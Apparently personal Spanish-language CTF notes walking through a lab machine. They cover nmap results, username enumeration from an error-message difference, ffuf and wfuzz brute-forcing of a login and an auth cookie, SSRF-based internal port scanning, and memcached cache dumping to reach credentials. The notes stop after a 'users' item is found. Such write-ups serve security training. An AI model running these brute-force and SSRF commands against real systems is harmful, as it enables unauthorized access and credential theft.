PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

-Vamos al puerto 80 y nos Encontramos un Panel de Login

-Si ponemos **Credenciales al Azar**, nos sale este mensaje de Error:
	-Username: test
	-Password: test
		-**Error: Login failed.**

-Si ponemos el usuario=admin, nos sale con una pequeña diferencia:
	-Username: admin
	-Password: test
		**Error: Login failed**  (No sale el Punto del Final!!)

-Esto pequeño cambio puede deberse a que el usuario 'admin' existe en el sistema

## Login Brute Force (Fuff) - Authentication 

-Hacemos Fuerza Bruta al Login con Ffuf:
	-ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "username=admin&password=FUZZ&submit=Login" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.86/login -fw 106,38 -fr "Error: Login failed."
		**Password1** 
		(Contraseña Encontrada!!!)

-Nos vamos a la web del Puerto 8080 y nos dice lo siguiente:
	-**Access denied:** password authentication **cookie not set**

-Aun siendo usuario 'admin', no nos deja acceder, vamos a Interceptar la Petición con BurpSuite:
	-Vemos la siguiente Cookie:
		Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.GzMNTA.bAq1nIBmlb9wVlee5kdK8t6ES8s

-Como nos dice que la Password no está seteada, vamos a probar a añadir una cookie llamada 'password' con cualquier cosa:
	-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.GzMNTA.bAq1nIBmlb9wVlee5kdK8t6ES8s **;password=algo**
		Access denied: password authentication **cookie incorrect**
			-La Respuesta a cambiado, parece que va por aquí

-Mandamos la Petición, esta vez con la Contraseña del usuario 'admin' en la Cookie:
	-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.GzMNTA.bAq1nIBmlb9wVlee5kdK8t6ES8s;password=Password1
		**cookie incorrect**

## Cookie Brute Force (Wfuzz) - Authentication 

-Hacemos Ataque de Fuera Bruta para Averiguar la Password de la Cookie:
	-wfuzz -c --hw=29 -t 40 -w /usr/share/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -X POST -b "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.GzMNTA.bAq1nIBmlb9wVlee5kdK8t6ES8s;password=FUZZ" http://10.10.10.86:8080/
		**secret**
		(Contraseña Encontrada!!)

-Le damos a Forward y Conseguimos Acceder a --> http://10.10.10.86:8080/

-Añadimos una Nueva Cookie en 'Storage' con el valor --> password:secret para que la Web no nos eche todo el rato.

-------------------------------------------------------------------------

-En la Web del Puerto 8080, encontramos Un Input para Poner un Puerto TCP y otro para Enviar una Petición, Posible SSRF

-Intentamos poner --> Puerto 80 + Nuestra IP pero nos dice:
	**Suspected hacking attempt detected**

-Probamos a Poner un Puerto que sabemos que está Abierto:
	-Puerto 22 ; localhost
		**SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4**
		(CONFIRMAMOS SSRF!!!)

## SSRF - Internal Port Discovery (Wfuzz)

-wfuzz -c --hw=40 -t 20 -z range,1-65535 "http://10.10.10.86:8080/socket?port=FUZZ&cmd=localhost"
"21"                                                                                                                     
"22"                                                                                                                     
"80"                                                                                                                     
"8080"                                                                                                                   
**"11211"**                 **Este es el que nos Interesa!!**                                                                                     
"40196" 

-El **Puerto 11211** se suele Usar con el Servicio '**Memcached**', que es un **sistema de almacenamiento en caché de objetos en memoria.**

## Memcached Enumearion through SSRF

-Nos vamos al siguiente apartado de Hacktricks para Enumerar el Servicio 'Memcached':
	https://book.hacktricks.wiki/en/network-services-pentesting/11211-memcache/index.html

-Enumeramos la Versión:
	-Port 11211 ; Command: version
		**VERSION 1.4.25 Ubuntu**

-Enumeramos 'slabs':
	-Port 11211 ; Command: stats slabs
		STAT 16
		STAT 26

-Enumeramos el Contenido del STAT 26:
	-Port 11211 ; Command: stats cachedump 26 0
		**ITEM users [24625 b; 1750173636 s]**
		(Tenemos una Credencial!!)




